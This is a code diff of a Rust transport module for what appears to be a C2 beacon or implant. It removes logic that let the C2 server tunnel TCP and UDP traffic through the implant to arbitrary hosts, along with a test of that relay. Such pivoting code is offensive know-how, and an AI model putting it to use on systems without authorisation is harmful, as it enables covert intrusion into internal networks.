@@ -14,10 +14,7 @@ use crate::dns_resolver::doh::{DohProvider, HickoryResolverService};
 
 use crate::Transport;
 
-use pb::portal::payload::Payload as PortalPayloadEnum;
-use pb::portal::{BytesMessageKind, TcpMessage, UdpMessage};
 use std::time::Duration;
-use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio_stream::StreamExt;
 
 static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
@@ -201,52 +198,37 @@ impl Transport for GRPC {
 
     async fn create_portal(
         &mut self,
-        mut rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
-        _tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
+        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
+        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
     ) -> Result<()> {
-        // 1. Get task_id from first message
-        let first_msg = match rx.recv().await {
-            Some(msg) => msg,
-            None => return Ok(()),
-        };
-        let task_id = first_msg.task_id;
+        // Wrap receiver in stream
+        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
 
-        // 2. Setup outbound channel (to C2)
-        let (outbound_tx, outbound_rx) = tokio::sync::mpsc::channel(32);
+        // Open gRPC Bi-Directional Stream
+        let resp = self.create_portal_impl(req_stream).await?;
+        let mut resp_stream = resp.into_inner();
 
-        // 3. Send first message
-        if outbound_tx.send(first_msg).await.is_err() {
-            return Ok(());
-        }
-
-        // 4. Spawn rx forwarder
-        let outbound_tx_clone = outbound_tx.clone();
-        let forwarder_handle = tokio::spawn(async move {
-            while let Some(msg) = rx.recv().await {
-                if outbound_tx_clone.send(msg).await.is_err() {
-                    break;
+        // Spawn task to deliver responses to the portal module
+        tokio::spawn(async move {
+            loop {
+                let msg_result = resp_stream.message().await;
+                match msg_result {
+                    Ok(Some(msg)) => {
+                        if tx.send(msg).await.is_err() {
+                            break;
+                        }
+                    }
+                    Ok(None) => break,
+                    Err(e) => {
+                         #[cfg(debug_assertions)]
+                         log::error!("Portal stream error: {}", e);
+                         break;
+                    }
                 }
             }
         });
 
-        // 5. Start gRPC stream
-        let req_stream = tokio_stream::wrappers::ReceiverStream::new(outbound_rx);
-        let response = match self.create_portal_impl(req_stream).await {
-            Ok(r) => r,
-            Err(e) => {
-                forwarder_handle.abort();
-                return Err(anyhow::Error::from(e));
-            }
-        };
-        let resp_stream = response.into_inner();
-
-        // 6. Run loop
-        let result = Self::run_portal_loop(resp_stream, outbound_tx, task_id).await;
-
-        // Cleanup
-        forwarder_handle.abort();
-
-        result
+        Ok(())
     }
 
     fn get_type(&mut self) -> pb::c2::beacon::Transport {
@@ -297,281 +279,6 @@ impl GRPC {
             .unwrap()
             .streaming(req, path, codec)
             .await
-    }
-
-    async fn run_portal_loop<S>(
-        mut resp_stream: S,
-        outbound_tx: tokio::sync::mpsc::Sender<CreatePortalRequest>,
-        task_id: i64,
-    ) -> Result<()>
-    where
-        S: tokio_stream::Stream<Item = Result<CreatePortalResponse, tonic::Status>> + Unpin,
-    {
-        use std::sync::{Arc, Mutex};
-
-        // Map stores Sender to the connection handler task
-        // Key: src_port
-        let connections: Arc<
-            Mutex<std::collections::HashMap<u32, tokio::sync::mpsc::Sender<Vec<u8>>>>,
-        > = Arc::new(Mutex::new(std::collections::HashMap::new()));
-
-        while let Some(msg_result) = resp_stream.next().await {
-            let msg = match msg_result {
-                Ok(m) => m,
-                Err(e) => {
-                    log::error!("Portal stream error: {}", e);
-                    break;
-                }
-            };
-
-            if let Some(payload_enum) = msg.payload.and_then(|p| p.payload) {
-                match payload_enum {
-                    PortalPayloadEnum::Tcp(tcp_msg) => {
-                        let src_port = tcp_msg.src_port;
-                        let mut map = connections.lock().unwrap();
-
-                        let tx = if let Some(tx) = map.get(&src_port) {
-                            if tx.is_closed() {
-                                None
-                            } else {
-                                Some(tx.clone())
-                            }
-                        } else {
-                            None
-                        };
-
-                        if let Some(tx) = tx {
-                            if !tcp_msg.data.is_empty() {
-                                tokio::spawn(async move {
-                                    let _ = tx.send(tcp_msg.data).await;
-                                });
-                            }
-                        } else {
-                            let (tx, rx) = tokio::sync::mpsc::channel(100);
-                            map.insert(src_port, tx.clone());
-
-                            let map_clone = connections.clone();
-                            let outbound_tx_clone = outbound_tx.clone();
-                            let dst_addr = tcp_msg.dst_addr;
-                            let dst_port = tcp_msg.dst_port;
-                            let initial_data = tcp_msg.data;
-
-                            if !initial_data.is_empty() {
-                                let tx_inner = tx.clone();
-                                tokio::spawn(async move {
-                                    let _ = tx_inner.send(initial_data).await;
-                                });
-                            }
-
-                            tokio::spawn(async move {
-                                Self::handle_tcp_connection(
-                                    rx,
-                                    src_port,
-                                    dst_addr,
-                                    dst_port,
-                                    outbound_tx_clone,
-                                    map_clone,
-                                    task_id,
-                                )
-                                .await;
-                            });
-                        }
-                    }
-                    PortalPayloadEnum::Udp(udp_msg) => {
-                        let src_port = udp_msg.src_port;
-                        let mut map = connections.lock().unwrap();
-
-                        let tx = if let Some(tx) = map.get(&src_port) {
-                            if tx.is_closed() {
-                                None
-                            } else {
-                                Some(tx.clone())
-                            }
-                        } else {
-                            None
-                        };
-
-                        if let Some(tx) = tx {
-                            if !udp_msg.data.is_empty() {
-                                tokio::spawn(async move {
-                                    let _ = tx.send(udp_msg.data).await;
-                                });
-                            }
-                        } else {
-                            let (tx, rx) = tokio::sync::mpsc::channel(100);
-                            map.insert(src_port, tx.clone());
-
-                            let map_clone = connections.clone();
-                            let outbound_tx_clone = outbound_tx.clone();
-                            let dst_addr = udp_msg.dst_addr;
-                            let dst_port = udp_msg.dst_port;
-                            let initial_data = udp_msg.data;
-
-                            if !initial_data.is_empty() {
-                                let tx_inner = tx.clone();
-                                tokio::spawn(async move {
-                                    let _ = tx_inner.send(initial_data).await;
-                                });
-                            }
-
-                            tokio::spawn(async move {
-                                Self::handle_udp_connection(
-                                    rx,
-                                    src_port,
-                                    dst_addr,
-                                    dst_port,
-                                    outbound_tx_clone,
-                                    map_clone,
-                                    task_id,
-                                )
-                                .await;
-                            });
-                        }
-                    }
-                    PortalPayloadEnum::Bytes(bytes_msg) => {
-                        if bytes_msg.kind == BytesMessageKind::Ping as i32 {
-                            let req = CreatePortalRequest {
-                                task_id,
-                                payload: Some(pb::portal::Payload {
-                                    payload: Some(PortalPayloadEnum::Bytes(bytes_msg)),
-                                }),
-                            };
-                            let _ = outbound_tx.send(req).await;
-                        }
-                    }
-                }
-            }
-        }
-
-        Ok(())
-    }
-
-    async fn handle_tcp_connection(
-        mut rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
-        src_port: u32,
-        dst_addr: String,
-        dst_port: u32,
-        outbound_tx: tokio::sync::mpsc::Sender<CreatePortalRequest>,
-        connections: std::sync::Arc<
-            std::sync::Mutex<std::collections::HashMap<u32, tokio::sync::mpsc::Sender<Vec<u8>>>>,
-        >,
-        task_id: i64,
-    ) {
-        let addr = format!("{}:{}", dst_addr, dst_port);
-        match tokio::net::TcpStream::connect(&addr).await {
-            Ok(stream) => {
-                let (mut reader, mut writer) = stream.into_split();
-                let mut buf = [0u8; 4096];
-
-                loop {
-                    tokio::select! {
-                        res = reader.read(&mut buf) => {
-                            match res {
-                                Ok(0) => break, // EOF
-                                Ok(n) => {
-                                    let req = CreatePortalRequest {
-                                        task_id,
-                                        payload: Some(pb::portal::Payload {
-                                            payload: Some(PortalPayloadEnum::Tcp(TcpMessage {
-                                                data: buf[0..n].to_vec(),
-                                                dst_addr: dst_addr.clone(),
-                                                dst_port,
-                                                src_port,
-                                            })),
-                                        }),
-                                    };
-                                    if outbound_tx.send(req).await.is_err() {
-                                        break;
-                                    }
-                                }
-                                Err(_) => break,
-                            }
-                        }
-                        res = rx.recv() => {
-                            match res {
-                                Some(data) => {
-                                    if writer.write_all(&data).await.is_err() {
-                                        break;
-                                    }
-                                }
-                                None => break, // Channel closed
-                            }
-                        }
-                    }
-                }
-            }
-            Err(e) => {
-                log::error!("TCP Connect failed: {}", e);
-            }
-        }
-
-        // Cleanup
-        connections.lock().unwrap().remove(&src_port);
-    }
-
-    async fn handle_udp_connection(
-        mut rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
-        src_port: u32,
-        dst_addr: String,
-        dst_port: u32,
-        outbound_tx: tokio::sync::mpsc::Sender<CreatePortalRequest>,
-        connections: std::sync::Arc<
-            std::sync::Mutex<std::collections::HashMap<u32, tokio::sync::mpsc::Sender<Vec<u8>>>>,
-        >,
-        task_id: i64,
-    ) {
-        let addr = format!("{}:{}", dst_addr, dst_port);
-        // Bind 0.0.0.0:0
-        let socket = match tokio::net::UdpSocket::bind("0.0.0.0:0").await {
-            Ok(s) => s,
-            Err(_) => {
-                connections.lock().unwrap().remove(&src_port);
-                return;
-            }
-        };
-        if socket.connect(&addr).await.is_err() {
-            connections.lock().unwrap().remove(&src_port);
-            return;
-        }
-
-        let socket = std::sync::Arc::new(socket);
-        let mut buf = [0u8; 65535];
-        loop {
-            tokio::select! {
-                res = socket.recv(&mut buf) => {
-                    match res {
-                        Ok(n) => {
-                             let req = CreatePortalRequest {
-                                task_id,
-                                payload: Some(pb::portal::Payload {
-                                    payload: Some(PortalPayloadEnum::Udp(UdpMessage {
-                                        data: buf[0..n].to_vec(),
-                                        dst_addr: dst_addr.clone(),
-                                        dst_port,
-                                        src_port,
-                                    })),
-                                }),
-                            };
-                            if outbound_tx.send(req).await.is_err() {
-                                break;
-                            }
-                        }
-                        Err(_) => break,
-                    }
-                }
-                res = rx.recv() => {
-                    match res {
-                        Some(data) => {
-                            if socket.send(&data).await.is_err() {
-                                break;
-                            }
-                        }
-                        None => break,
-                    }
-                }
-            }
-        }
-        connections.lock().unwrap().remove(&src_port);
     }
 
     ///
@@ -783,80 +490,5 @@ impl GRPC {
             .unwrap()
             .streaming(req, path, codec)
             .await
-    }
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-    use pb::portal::payload::Payload as PortalPayloadEnum;
-    use pb::portal::TcpMessage;
-    use tokio::sync::mpsc;
-
-    #[tokio::test]
-    async fn test_run_portal_loop_tcp() {
-        // Start a local TCP listener to act as target
-        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
-        let addr = listener.local_addr().unwrap();
-        let (target_tx, mut target_rx) = mpsc::channel(10);
-
-        tokio::spawn(async move {
-            let (mut socket, _) = listener.accept().await.unwrap();
-            let mut buf = [0u8; 1024];
-            let n = socket.read(&mut buf).await.unwrap();
-            target_tx.send(buf[0..n].to_vec()).await.unwrap();
-            socket.write_all(b"pong").await.unwrap();
-        });
-
-        // Setup stream
-        let (outbound_tx, mut outbound_rx) = mpsc::channel(10);
-        let task_id = 123;
-
-        let (server_tx, server_rx) = mpsc::channel(10);
-        let stream = tokio_stream::wrappers::ReceiverStream::new(server_rx);
-
-        let loop_handle =
-            tokio::spawn(async move { GRPC::run_portal_loop(stream, outbound_tx, task_id).await });
-
-        // Send message to portal loop
-        server_tx
-            .send(Ok(CreatePortalResponse {
-                payload: Some(pb::portal::Payload {
-                    payload: Some(PortalPayloadEnum::Tcp(TcpMessage {
-                        data: b"ping".to_vec(),
-                        dst_addr: "127.0.0.1".to_string(),
-                        dst_port: addr.port() as u32,
-                        src_port: 5555,
-                    })),
-                }),
-            }))
-            .await
-            .unwrap();
-
-        // Verify target received data
-        // Use timeout to avoid hanging
-        let received = tokio::time::timeout(Duration::from_secs(2), target_rx.recv())
-            .await
-            .expect("timeout waiting for target receive")
-            .expect("target channel closed");
-        assert_eq!(received, b"ping");
-
-        // Verify we get response back in outbound_tx
-        let resp = tokio::time::timeout(Duration::from_secs(2), outbound_rx.recv())
-            .await
-            .expect("timeout waiting for outbound response")
-            .expect("outbound channel closed");
-
-        assert_eq!(resp.task_id, task_id);
-        if let Some(PortalPayloadEnum::Tcp(tcp)) = resp.payload.unwrap().payload {
-            assert_eq!(tcp.data, b"pong");
-            assert_eq!(tcp.src_port, 5555);
-        } else {
-            panic!("Expected TCP message");
-        }
-
-        // Cleanup
-        drop(server_tx);
-        loop_handle.await.unwrap().unwrap();
     }
 }
